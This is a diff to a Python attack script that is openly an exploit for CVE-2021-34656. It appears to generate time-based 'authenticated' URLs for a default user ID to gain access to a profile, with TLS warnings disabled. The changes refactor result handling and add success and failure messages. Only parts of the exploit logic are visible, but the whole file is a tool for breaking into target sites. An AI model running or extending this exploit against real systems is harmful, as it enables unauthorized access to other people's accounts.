@@ -9,6 +9,7 @@ import time
 import urllib.parse
 from colorama import init, Fore, Style
 import urllib3
+
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 init(autoreset=True)
@@ -17,7 +18,6 @@ DEFAULT_USER_ID = 1
 COUNT = 5
 
 def generate_auth_url(profile_url, count):
-
     print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Starting exploit for {profile_url} with user ID {DEFAULT_USER_ID}...")
 
     s = int(time.time())
@@ -39,13 +39,19 @@ def generate_auth_url(profile_url, count):
             print(f"{Style.BRIGHT}{Fore.GREEN}[+] ----- Authenticated URL Found ------")
             print(f"{auth_url}")
             print(f"{Style.BRIGHT}{Fore.GREEN}[+] -----------------------------------")
-            break
-    else:
-        print(f"{Style.BRIGHT}{Fore.RED}[-] Exploit failed or no redirection detected.")
+            return True 
+
+    print(f"{Style.BRIGHT}{Fore.RED}[-] Exploit failed or no redirection detected.")
+    return False 
 
 def scan_cve_2021_34656(profile_url):
+    success = generate_auth_url(profile_url, COUNT)
 
-    generate_auth_url(profile_url, COUNT)
-
+    if success:
+        print(f"{Style.BRIGHT}{Fore.GREEN}[•] Exploit successful for {profile_url}.")
+    else:
+        print(f"{Style.BRIGHT}{Fore.RED}[•] Exploit failed for {profile_url}.")
+    
     print(f"{Style.BRIGHT}{Fore.YELLOW}[•] Exploit finished for {profile_url}.")
+
     
